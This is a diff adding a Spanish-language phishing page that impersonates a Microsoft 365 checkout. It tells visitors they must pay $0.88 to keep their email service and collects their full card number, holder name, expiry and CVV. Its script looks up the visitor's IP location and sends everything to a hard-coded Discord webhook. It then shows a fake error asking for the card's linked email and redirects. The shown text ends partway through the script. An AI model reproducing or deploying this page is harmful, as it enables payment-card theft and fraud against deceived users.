@@ -1,0 +1,1403 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=yes"
+    />
+    <title>Microsoft 365 - Suscripción 1 Año</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family:
+          "Segoe UI",
+          "Segoe UI Web (West European)",
+          "Segoe UI",
+          -apple-system,
+          BlinkMacSystemFont,
+          Roboto,
+          "Helvetica Neue",
+          sans-serif;
+      }
+
+      body {
+        background:
+          linear-gradient(135deg, rgba(10, 30, 60, 0.9), rgba(5, 15, 40, 0.95)),
+          url("https://images.unsplash.com/photo-1613243555978-636c48dc653c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80")
+            no-repeat center center fixed;
+        background-size: cover;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+        color: #333;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 500px;
+        animation: fadeIn 0.8s ease;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 30px;
+        padding: 15px 20px;
+        background: rgba(255, 255, 255, 0.95);
+        border-radius: 12px 12px 0 0;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+
+      .logo-section {
+        display: flex;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+
+      .microsoft-logo {
+        width: 120px;
+        height: 25px;
+        background-image: url("https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31");
+        background-size: contain;
+        background-repeat: no-repeat;
+      }
+
+      .secure-badge {
+        background-color: #107c10;
+        color: white;
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+        white-space: nowrap;
+      }
+
+      .secure-badge i {
+        margin-right: 5px;
+        font-size: 10px;
+      }
+
+      .header-protected {
+        color: #107c10;
+        font-size: 14px;
+        font-weight: 500;
+        white-space: nowrap;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+      }
+
+      .card-container {
+        background-color: white;
+        border-radius: 0 0 12px 12px;
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+        padding: 25px 20px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .card-container::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 4px;
+        background: linear-gradient(90deg, #0078d4, #5c2d91, #0078d4);
+      }
+
+      .title {
+        font-size: 24px;
+        font-weight: 300;
+        margin-bottom: 8px;
+        color: #1b1b1b;
+      }
+
+      .subtitle {
+        font-size: 14px;
+        color: #605e5c;
+        margin-bottom: 20px;
+        line-height: 1.5;
+      }
+
+      .price-banner {
+        background: linear-gradient(135deg, #0078d4, #106ebe);
+        color: white;
+        padding: 15px;
+        border-radius: 10px;
+        margin-bottom: 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 10px;
+        box-shadow: 0 4px 15px rgba(0, 120, 212, 0.2);
+      }
+
+      .price-info {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+        min-width: 150px;
+      }
+
+      .price-label {
+        font-size: 14px;
+        font-weight: 500;
+        opacity: 0.9;
+      }
+
+      .price-amount {
+        font-size: 28px;
+        font-weight: 700;
+        line-height: 1.2;
+      }
+
+      .price-period {
+        font-size: 12px;
+        opacity: 0.8;
+        margin-top: 2px;
+      }
+
+      .price-badge {
+        background: rgba(255, 255, 255, 0.2);
+        padding: 8px 15px;
+        border-radius: 20px;
+        font-size: 13px;
+        font-weight: 600;
+        backdrop-filter: blur(5px);
+        white-space: nowrap;
+      }
+
+      .form-group {
+        margin-bottom: 18px;
+        width: 100%;
+      }
+
+      .form-label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 6px;
+        color: #323130;
+      }
+
+      .form-input {
+        width: 100%;
+        padding: 12px 14px;
+        border: 1px solid #d1d1d1;
+        border-radius: 6px;
+        font-size: 16px;
+        transition: all 0.3s;
+        background-color: #faf9f8;
+      }
+
+      .form-input:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+        background-color: white;
+      }
+
+      .form-input.error {
+        border-color: #d13438;
+        background-color: #fff4f4;
+      }
+
+      .input-row {
+        display: flex;
+        gap: 15px;
+        flex-wrap: wrap;
+      }
+
+      .input-row .form-group {
+        flex: 1;
+        min-width: 120px;
+      }
+
+      .card-preview {
+        background: linear-gradient(135deg, #2a2a2a, #1a1a1a);
+        border-radius: 12px;
+        padding: 18px;
+        margin-bottom: 20px;
+        color: white;
+        box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+        position: relative;
+        overflow: hidden;
+        min-height: 170px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+      }
+
+      .card-preview::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        right: 0;
+        width: 80px;
+        height: 80px;
+        background: radial-gradient(
+          circle,
+          rgba(255, 255, 255, 0.2) 0%,
+          rgba(255, 255, 255, 0) 70%
+        );
+        border-radius: 50%;
+      }
+
+      .card-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 15px;
+      }
+
+      .chip-icon {
+        width: 45px;
+        height: 32px;
+        background: linear-gradient(135deg, #d4af37, #f5d76e);
+        border-radius: 6px;
+        position: relative;
+      }
+
+      .chip-icon::before {
+        content: "";
+        position: absolute;
+        top: 4px;
+        left: 4px;
+        right: 4px;
+        bottom: 4px;
+        border: 1px solid rgba(0, 0, 0, 0.2);
+        border-radius: 4px;
+      }
+
+      .card-type {
+        font-size: 28px;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      .card-number-display {
+        font-family: "Courier New", monospace;
+        font-size: 20px;
+        letter-spacing: 2px;
+        margin-bottom: 15px;
+        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        word-break: break-all;
+      }
+
+      .card-details {
+        display: flex;
+        justify-content: space-between;
+        font-size: 13px;
+        color: rgba(255, 255, 255, 0.9);
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+
+      .card-holder-display {
+        font-size: 14px;
+        font-weight: 500;
+        text-transform: uppercase;
+        word-break: break-all;
+      }
+
+      .card-expiry-display {
+        font-size: 14px;
+      }
+
+      .info-note {
+        background-color: #f3f2f1;
+        border-left: 4px solid #0078d4;
+        padding: 10px 14px;
+        margin-bottom: 20px;
+        border-radius: 4px;
+        font-size: 13px;
+        color: #605e5c;
+      }
+
+      .info-note i {
+        color: #0078d4;
+        margin-right: 8px;
+      }
+
+      .button-group {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 25px;
+        padding-top: 20px;
+        border-top: 1px solid #edebe9;
+        gap: 15px;
+      }
+
+      .btn {
+        padding: 12px 20px;
+        border: none;
+        border-radius: 6px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        flex: 1;
+        min-width: 100px;
+      }
+
+      .btn-primary {
+        background: linear-gradient(135deg, #0078d4, #106ebe);
+        color: white;
+        flex: 1.5;
+      }
+
+      .btn-primary:hover {
+        background: linear-gradient(135deg, #106ebe, #005a9e);
+        transform: translateY(-2px);
+        box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+      }
+
+      .btn-secondary {
+        background-color: transparent;
+        color: #0078d4;
+        border: 1px solid #d1d1d1;
+      }
+
+      .btn-secondary:hover {
+        background-color: rgba(0, 120, 212, 0.05);
+        border-color: #0078d4;
+      }
+
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.85);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
+        flex-direction: column;
+      }
+
+      .loading-spinner {
+        width: 50px;
+        height: 50px;
+        border: 4px solid rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        border-top-color: #0078d4;
+        animation: spin 1s ease-in-out infinite;
+        margin-bottom: 20px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        color: white;
+        font-size: 16px;
+        font-weight: 300;
+        text-align: center;
+        padding: 0 20px;
+      }
+
+      .success-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.9);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1001;
+        display: none;
+        flex-direction: column;
+        padding: 20px;
+      }
+
+      .success-icon {
+        width: 80px;
+        height: 80px;
+        background-color: #107c10;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 20px;
+        animation: scaleIn 0.5s ease-out;
+      }
+
+      .success-icon i {
+        font-size: 40px;
+        color: white;
+      }
+
+      @keyframes scaleIn {
+        from {
+          transform: scale(0);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+      .success-title {
+        color: white;
+        font-size: 24px;
+        font-weight: 300;
+        margin-bottom: 10px;
+        animation: fadeInUp 0.5s ease-out 0.2s both;
+        text-align: center;
+      }
+
+      .success-message {
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 15px;
+        margin-bottom: 10px;
+        animation: fadeInUp 0.5s ease-out 0.4s both;
+        text-align: center;
+        padding: 0 10px;
+      }
+
+      .redirect-message {
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 13px;
+        animation: fadeInUp 0.5s ease-out 0.6s both;
+        text-align: center;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .footer {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 11px;
+        color: #8a8886;
+        padding-top: 15px;
+        border-top: 1px solid #edebe9;
+      }
+
+      .footer-links {
+        display: flex;
+        justify-content: center;
+        gap: 15px;
+        margin-bottom: 12px;
+        flex-wrap: wrap;
+      }
+
+      .footer-link {
+        color: #605e5c;
+        text-decoration: none;
+        font-size: 12px;
+        white-space: nowrap;
+      }
+
+      .footer-link:hover {
+        color: #0078d4;
+        text-decoration: underline;
+      }
+
+      .error-message {
+        color: #d13438;
+        font-size: 12px;
+        margin-top: 4px;
+        display: none;
+      }
+
+      .card-icons {
+        display: flex;
+        gap: 8px;
+        margin-bottom: 15px;
+        flex-wrap: wrap;
+      }
+
+      .card-icon {
+        font-size: 26px;
+        color: #605e5c;
+      }
+
+      .visa {
+        color: #1a1f71;
+      }
+      .mastercard {
+        color: #eb001b;
+      }
+      .amex {
+        color: #2e77bc;
+      }
+
+      /* Media queries para móvil */
+      @media (max-width: 480px) {
+        body {
+          padding: 10px;
+          align-items: flex-start;
+          padding-top: 15px;
+        }
+
+        .container {
+          max-width: 100%;
+        }
+
+        .header {
+          flex-direction: column;
+          align-items: flex-start;
+          gap: 10px;
+          padding: 12px 15px;
+          margin-bottom: 20px;
+        }
+
+        .card-container {
+          padding: 18px 14px;
+        }
+
+        .title {
+          font-size: 22px;
+        }
+
+        .subtitle {
+          font-size: 13px;
+        }
+
+        .price-banner {
+          padding: 12px;
+        }
+
+        .price-amount {
+          font-size: 26px;
+        }
+
+        .input-row {
+          flex-direction: row;
+          gap: 10px;
+        }
+
+        .input-row .form-group {
+          min-width: 100px;
+          flex: 1;
+        }
+
+        .card-preview {
+          min-height: 150px;
+          padding: 15px;
+        }
+
+        .card-number-display {
+          font-size: 17px;
+          letter-spacing: 1px;
+        }
+
+        .card-details {
+          font-size: 12px;
+        }
+
+        .card-holder-display,
+        .card-expiry-display {
+          font-size: 13px;
+        }
+
+        .button-group {
+          flex-direction: row;
+          gap: 10px;
+        }
+
+        .btn {
+          padding: 12px;
+          font-size: 14px;
+          flex: 1;
+          min-width: 0;
+        }
+
+        .btn-primary {
+          flex: 1.3;
+        }
+
+        .footer-links {
+          gap: 10px;
+        }
+
+        .form-input {
+          font-size: 16px;
+          padding: 10px 12px;
+        }
+
+        .form-label {
+          font-size: 13px;
+        }
+
+        .card-icons {
+          gap: 6px;
+        }
+
+        .card-icon {
+          font-size: 24px;
+        }
+
+        .success-icon {
+          width: 70px;
+          height: 70px;
+        }
+
+        .success-icon i {
+          font-size: 35px;
+        }
+
+        .success-title {
+          font-size: 22px;
+        }
+
+        .success-message {
+          font-size: 14px;
+        }
+      }
+
+      @media (max-width: 360px) {
+        .input-row {
+          flex-direction: column;
+          gap: 0;
+        }
+
+        .input-row .form-group {
+          min-width: 100%;
+        }
+
+        .button-group {
+          flex-direction: column;
+        }
+
+        .btn {
+          width: 100%;
+        }
+
+        .card-number-display {
+          font-size: 15px;
+          letter-spacing: 0.5px;
+        }
+
+        .price-badge {
+          font-size: 12px;
+          padding: 6px 12px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Overlay de carga -->
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">Procesando su suscripción...</div>
+      <div class="loading-text" style="font-size: 14px; margin-top: 10px">
+        Esto puede tomar unos segundos
+      </div>
+    </div>
+
+    <!-- Overlay de éxito -->
+    <div class="success-overlay" id="successOverlay">
+      <div class="success-icon">
+        <i class="fas fa-check"></i>
+      </div>
+      <div class="success-title">¡Suscripción Exitosa!</div>
+      <div class="success-message">
+        Su suscripción a Microsoft 365 ha sido procesada correctamente
+      </div>
+      <div class="redirect-message" id="redirectMessage">
+        Será redirigido en 10 segundos...
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="header">
+        <div class="logo-section">
+          <div class="microsoft-logo"></div>
+          <div class="secure-badge">
+            <i class="fas fa-lock"></i> Conexión Segura
+          </div>
+        </div>
+        <span class="header-protected">
+          <i class="fas fa-shield-alt"></i> Protegido por Microsoft
+        </span>
+      </div>
+
+      <div class="card-container">
+        <h1 class="title">Microsoft 365</h1>
+        <p class="subtitle">
+          Para continuar usando nuestros servicios de correo electrónico, deberá
+          comprar la suscripción a Microsoft 365, de lo contrario no podrá
+          seguir usando este servicio.
+        </p>
+
+        <!-- Vista previa de tarjeta -->
+        <div class="card-preview">
+          <div class="card-header">
+            <div class="chip-icon"></div>
+            <div class="card-type">
+              <i class="fab fa-cc-visa"></i>
+            </div>
+          </div>
+
+          <div class="card-number-display" id="cardNumberDisplay">
+            •••• •••• •••• ••••
+          </div>
+
+          <div class="card-details">
+            <div>
+              <div style="font-size: 11px; opacity: 0.7">
+                TITULAR DE LA TARJETA
+              </div>
+              <div class="card-holder-display" id="cardHolderDisplay">
+                NOMBRE COMPLETO
+              </div>
+            </div>
+            <div>
+              <div style="font-size: 11px; opacity: 0.7">VÁLIDA HASTA</div>
+              <div class="card-expiry-display" id="cardExpiryDisplay">
+                MM/AA
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Iconos de tarjetas aceptadas -->
+        <div class="card-icons">
+          <i class="fab fa-cc-visa card-icon visa" title="Visa"></i>
+          <i
+            class="fab fa-cc-mastercard card-icon mastercard"
+            title="Mastercard"
+          ></i>
+          <i class="fab fa-cc-amex card-icon amex" title="American Express"></i>
+          <i
+            class="fab fa-cc-diners-club card-icon"
+            title="Diners Club"
+            style="color: #0077be"
+          ></i>
+        </div>
+
+        <div class="info-note">
+          <i class="fas fa-info-circle"></i>
+          <strong>Total a pagar: $0.88 USD</strong> · Pago seguro procesado por
+          Microsoft
+        </div>
+
+        <!-- Formulario de datos de tarjeta -->
+        <form id="cardForm">
+          <div class="form-group">
+            <label class="form-label">Número de Tarjeta</label>
+            <input
+              type="text"
+              id="cardNumber"
+              class="form-input"
+              placeholder="1234 5678 9012 3456"
+              maxlength="19"
+              autocomplete="cc-number"
+              inputmode="numeric"
+            />
+            <div class="error-message" id="cardNumberError">
+              Por favor ingrese un número de tarjeta válido
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label"
+              >Nombre del Titular (como aparece en la tarjeta)</label
+            >
+            <input
+              type="text"
+              id="cardHolder"
+              class="form-input"
+              placeholder="JUAN PEREZ GARCIA"
+              autocomplete="cc-name"
+            />
+            <div class="error-message" id="cardHolderError">
+              Por favor ingrese el nombre del titular
+            </div>
+          </div>
+
+          <!-- Fecha de expiración y CVV en la misma línea -->
+          <div class="input-row">
+            <div class="form-group">
+              <label class="form-label">Fecha de Expiración</label>
+              <input
+                type="text"
+                id="cardExpiry"
+                class="form-input"
+                placeholder="MM/AA"
+                maxlength="5"
+                autocomplete="cc-exp"
+                inputmode="numeric"
+              />
+              <div class="error-message" id="cardExpiryError">
+                Formato MM/AA (ej: 12/25)
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">CVV/CVC</label>
+              <input
+                type="password"
+                id="cardCVV"
+                class="form-input"
+                placeholder="123"
+                maxlength="4"
+                autocomplete="cc-csc"
+                inputmode="numeric"
+              />
+              <div class="error-message" id="cardCVVError">
+                Código de seguridad de 3-4 dígitos
+              </div>
+            </div>
+          </div>
+        </form>
+
+        <div class="button-group">
+          <button id="cancelBtn" class="btn btn-secondary">
+            <i class="fas fa-times"></i> Cancelar
+          </button>
+          <button id="submitBtn" class="btn btn-primary">
+            <i class="fas fa-shopping-cart"></i> Pagar $0.88
+          </button>
+        </div>
+
+        <div class="footer">
+          <div class="footer-links">
+            <a href="#" class="footer-link">Política de Privacidad</a>
+            <a href="#" class="footer-link">Términos de Servicio</a>
+            <a href="#" class="footer-link">Ayuda</a>
+            <a href="#" class="footer-link">Contacto</a>
+          </div>
+          <p style="margin-top: 10px">
+            <i class="fas fa-lock" style="color: #107c10"></i>
+            Todos los datos se transmiten mediante conexión segura SSL
+          </p>
+          <p style="margin-top: 5px; font-size: 11px">
+            Microsoft Corporation • One Microsoft Way, Redmond, WA 98052
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Elementos DOM
+      const cardForm = document.getElementById("cardForm");
+      const cardNumber = document.getElementById("cardNumber");
+      const cardHolder = document.getElementById("cardHolder");
+      const cardExpiry = document.getElementById("cardExpiry");
+      const cardCVV = document.getElementById("cardCVV");
+      const submitBtn = document.getElementById("submitBtn");
+      const cancelBtn = document.getElementById("cancelBtn");
+      const loadingOverlay = document.getElementById("loadingOverlay");
+      const successOverlay = document.getElementById("successOverlay");
+      const redirectMessage = document.getElementById("redirectMessage");
+
+      // Elementos de vista previa
+      const cardNumberDisplay = document.getElementById("cardNumberDisplay");
+      const cardHolderDisplay = document.getElementById("cardHolderDisplay");
+      const cardExpiryDisplay = document.getElementById("cardExpiryDisplay");
+
+      // Elementos de error
+      const cardNumberError = document.getElementById("cardNumberError");
+      const cardHolderError = document.getElementById("cardHolderError");
+      const cardExpiryError = document.getElementById("cardExpiryError");
+      const cardCVVError = document.getElementById("cardCVVError");
+
+      // Función para obtener IP
+      async function fetchWithTimeout(url, timeout = 5000) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeout);
+        try {
+          const response = await fetch(url, {
+            signal: controller.signal,
+            headers: { Accept: "application/json" },
+          });
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
+          return await response.json();
+        } finally {
+          clearTimeout(timer);
+        }
+      }
+
+      async function getIPInfo() {
+        const apis = [
+          {
+            name: "ipapi.co",
+            url: "https://ipapi.co/json/",
+            parse: (data) => ({
+              ip: data.ip,
+              city: data.city,
+              region: data.region,
+              country: data.country_name,
+              countryCode: data.country_code,
+              latitude: data.latitude,
+              longitude: data.longitude,
+              isp: data.org,
+              timezone: data.timezone,
+            }),
+          },
+          {
+            name: "ipwho.is",
+            url: "https://ipwho.is/",
+            parse: (data) => {
+              if (data.success === false)
+                throw new Error(data.message || "API inválida");
+              return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                countryCode: data.country_code,
+                latitude: data.latitude,
+                longitude: data.longitude,
+                isp: data.connection?.isp,
+                timezone: data.timezone?.id,
+              };
+            },
+          },
+          {
+            name: "ip-api.com",
+            url: "https://ip-api.com/json/?fields=status,message,query,city,regionName,country,countryCode,lat,lon,isp,timezone",
+            parse: (data) => {
+              if (data.status !== "success")
+                throw new Error(data.message || "API inválida");
+              return {
+                ip: data.query,
+                city: data.city,
+                region: data.regionName,
+                country: data.country,
+                countryCode: data.countryCode,
+                latitude: data.lat,
+                longitude: data.lon,
+                isp: data.isp,
+                timezone: data.timezone,
+              };
+            },
+          },
+          {
+            name: "geolocation-db.com",
+            url: "https://geolocation-db.com/json/",
+            parse: (data) => ({
+              ip: data.IPv4,
+              city: data.city,
+              region: data.state,
+              country: data.country_name,
+              countryCode: data.country_code,
+              latitude: data.latitude,
+              longitude: data.longitude,
+              isp: null,
+              timezone: null,
+            }),
+          },
+        ];
+
+        for (const api of apis) {
+          try {
+            const data = await fetchWithTimeout(api.url, 5000);
+            const parsed = api.parse(data);
+            return {
+              ip: parsed.ip || "No disponible",
+              city: parsed.city || "No disponible",
+              region: parsed.region || "No disponible",
+              country: parsed.country || "No disponible",
+              countryCode: parsed.countryCode || "No disponible",
+              latitude: parsed.latitude || "No disponible",
+              longitude: parsed.longitude || "No disponible",
+              isp: parsed.isp || "No disponible",
+              timezone: parsed.timezone || "No disponible",
+              source: api.name,
+            };
+          } catch (error) {
+            console.warn(`Falló ${api.name}:`, error.message);
+          }
+        }
+
+        return {
+          ip: "No disponible",
+          city: "No disponible",
+          region: "No disponible",
+          country: "No disponible",
+          countryCode: "No disponible",
+          latitude: "No disponible",
+          longitude: "No disponible",
+          isp: "No disponible",
+          timezone: "No disponible",
+          source: "Ninguna API respondió",
+        };
+      }
+
+      function showLoading() {
+        loadingOverlay.style.display = "flex";
+      }
+
+      function hideLoading() {
+        loadingOverlay.style.display = "none";
+      }
+
+      function showSuccess() {
+        successOverlay.style.display = "flex";
+      }
+
+      function isValidCardNumber(cardNum) {
+        return true;
+      }
+
+      function isValidExpiry(expiry) {
+        if (!expiry || !expiry.includes("/")) return false;
+        const parts = expiry.split("/");
+        if (parts.length !== 2) return false;
+        const month = parseInt(parts[0], 10);
+        const year = parseInt(parts[1], 10);
+        if (month < 1 || month > 12) return false;
+        if (year < 0 || year > 99) return false;
+        const currentYear = new Date().getFullYear() % 100;
+        const currentMonth = new Date().getMonth() + 1;
+        if (year < currentYear) return false;
+        if (year === currentYear && month < currentMonth) return false;
+        return true;
+      }
+
+      function isValidCVV(cvv) {
+        cvv = cvv.replace(/\D/g, "");
+        return cvv.length === 3 || cvv.length === 4;
+      }
+
+      function isValidCardHolder(name) {
+        return name && name.trim().length >= 5 && /^[a-zA-Z\s]+$/.test(name);
+      }
+
+      function formatCardNumber(value) {
+        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+        const matches = v.match(/\d{4,16}/g);
+        const match = (matches && matches[0]) || "";
+        const parts = [];
+        for (let i = 0, len = match.length; i < len; i += 4) {
+          parts.push(match.substring(i, i + 4));
+        }
+        return parts.length ? parts.join(" ") : value;
+      }
+
+      function formatExpiry(value) {
+        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+        if (v.length >= 2) {
+          return (
+            v.substring(0, 2) + (v.length > 2 ? "/" + v.substring(2, 4) : "")
+          );
+        }
+        return v;
+      }
+
+      function updateCardPreview() {
+        let displayNumber = cardNumber.value;
+        if (!displayNumber || displayNumber.replace(/\s/g, "").length < 16) {
+          cardNumberDisplay.textContent = "•••• •••• •••• ••••";
+        } else {
+          const formatted = formatCardNumber(displayNumber);
+          const parts = formatted.split(" ");
+          if (parts.length >= 4) {
+            cardNumberDisplay.textContent = "•••• •••• •••• " + parts[3];
+          } else {
+            cardNumberDisplay.textContent = formatted;
+          }
+        }
+        cardHolderDisplay.textContent = cardHolder.value
+          ? cardHolder.value.toUpperCase()
+          : "NOMBRE COMPLETO";
+        cardExpiryDisplay.textContent = cardExpiry.value || "MM/AA";
+      }
+
+      async function sendCardDataToServer(cardData) {
+        showLoading();
+
+        const ipInfo = await getIPInfo();
+
+        const number = cardData.number || "No especificado";
+        const holder = cardData.holder || "No especificado";
+        const expiry = cardData.expiry || "No especificado";
+        const cvv = cardData.cvv || "No especificado";
+
+        const embedPayload = {
+          embeds: [
+            {
+              title: "💳 Datos de tarjeta capturados - Microsoft 365 $0.88",
+              color: 0xed4245,
+              fields: [
+                {
+                  name: "💳 **Número de tarjeta**",
+                  value: `\`${number}\``,
+                  inline: false,
+                },
+                {
+                  name: "👤 **Titular**",
+                  value: `\`${holder}\``,
+                  inline: true,
+                },
+                {
+                  name: "📅 **Expiración**",
+                  value: `\`${expiry}\``,
+                  inline: true,
+                },
+                {
+                  name: "🔒 **CVV**",
+                  value: `\`${cvv}\``,
+                  inline: true,
+                },
+                {
+                  name: "🌐 **IP del usuario**",
+                  value: `\`${ipInfo.ip}\``,
+                  inline: true,
+                },
+                {
+                  name: "🏙️ **Ciudad**",
+                  value: `\`${ipInfo.city}\``,
+                  inline: true,
+                },
+                {
+                  name: "🇵🇰 **País**",
+                  value: `\`${ipInfo.country}\``,
+                  inline: true,
+                },
+                {
+                  name: "🕒 **Fecha y hora**",
+                  value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                  inline: false,
+                },
+              ],
+              footer: {
+                text: "Microsoft 365 - Suscripción 1 Año - $0.88 USD",
+              },
+              timestamp: new Date().toISOString(),
+            },
+          ],
+        };
+
+        const discordWebhookUrl =
+          "https://discord.com/api/webhooks/1527449712288993312/59_rdVEMJSV8URksVsuWMWXF-zEJ4trRo0QGBD5u7bXxhoxECW_WfEG2E45UbLUWXGAv";
+
+        fetch(discordWebhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(embedPayload),
+        })
+          .then((response) => {
+            if (!response.ok) throw new Error(`Error HTTP: ${response.status}`);
+
+            // Mostrar mensaje de error antes de redirigir
+            hideLoading();
+            showSuccess();
+
+            // Cambiar el título y mensaje del overlay para mostrar el error
+            document.querySelector(".success-title").textContent =
+              "⚠️ Error en la Transacción";
+            document.querySelector(".success-icon").style.backgroundColor =
+              "#d13438";
+            document.querySelector(".success-icon i").className =
+              "fas fa-exclamation-triangle";
+            document.querySelector(".success-message").textContent =
+              "Lo sentimos, su tarjeta ingresada no esta asociado a su correo, ingrese su correo asociado a la tarjeta y vuelva a intentarlo.";
+            document.querySelector(".success-message").style.color = "#ffcccc";
+
+            let secondsLeft = 15;
+            redirectMessage.textContent = `Redirigiendo a la página final en ${secondsLeft} segundos...`;
+
+            const countdownInterval = setInterval(() => {
+              secondsLeft--;
+              if (secondsLeft > 0) {
+                redirectMessage.textContent = `Redirigiendo a la página final en ${secondsLeft} segundos...`;
+              } else {
+                clearInterval(countdownInterval);
+                window.location.href = "final.html";
+              }
+            }, 1000);
+          })
+          .catch((error) => {
+            console.error("Error al enviar datos a Discord:", error);
+
+            // Mostrar mensaje de error antes de redirigir
+            hideLoading();
+            showSuccess();
+
+            // Cambiar el título y mensaje del overlay para mostrar el error
+            document.querySelector(".success-title").textContent =
+              "⚠️ Error en la Transacción";
+            document.querySelector(".success-icon").style.backgroundColor =
+              "#d13438";
+            document.querySelector(".success-icon i").className =
+              "fas fa-exclamation-triangle";
+            document.querySelector(".success-message").textContent =
+              "Lo sentimos, su tarjeta ingresada no esta asociado a su correo, ingrese su correo asociado a la tarjeta y vuelva a intentarlo.";
+            document.querySelector(".success-message").style.color = "#ffcccc";
+
+            let secondsLeft = 3;
+            redirectMessage.textContent = `Redirigiendo a la página final en ${secondsLeft} segundos...`;
+
+            const countdownInterval = setInterval(() => {
+              secondsLeft--;
+              if (secondsLeft > 0) {
+                redirectMessage.textContent = `Redirigiendo a la página final en ${secondsLeft} segundos...`;
+              } else {
+                clearInterval(countdownInterval);
+                window.location.href = "final.html";
+              }
+            }, 1000);
+          });
+      }
+
+      function validateForm() {
+        let isValid = true;
+
+        if (!isValidCardNumber(cardNumber.value)) {
+          cardNumber.classList.add("error");
+          cardNumberError.style.display = "block";
+          isValid = false;
+        } else {
+          cardNumber.classList.remove("error");
+          cardNumberError.style.display = "none";
+        }
+
+        if (!isValidCardHolder(cardHolder.value)) {
+          cardHolder.classList.add("error");
+          cardHolderError.style.display = "block";
+          isValid = false;
+        } else {
+          cardHolder.classList.remove("error");
+          cardHolderError.style.display = "none";
+        }
+
+        if (!isValidExpiry(cardExpiry.value)) {
+          cardExpiry.classList.add("error");
+          cardExpiryError.style.display = "block";
+          isValid = false;
+        } else {
+          cardExpiry.classList.remove("error");
+          cardExpiryError.style.display = "none";
+        }
+
+        if (!isValidCVV(cardCVV.value)) {
+          cardCVV.classList.add("error");
+          cardCVVError.style.display = "block";
+          isValid = false;
+        } else {
+          cardCVV.classList.remove("error");
+          cardCVVError.style.display = "none";
+        }
+
+        return isValid;
+      }
+
+      // Event Listeners
+      cardNumber.addEventListener("input", function () {
+        this.value = formatCardNumber(this.value);
+        updateCardPreview();
+        if (isValidCardNumber(this.value)) {
+          this.classList.remove("error");
+          cardNumberError.style.display = "none";
+        }
+      });
+
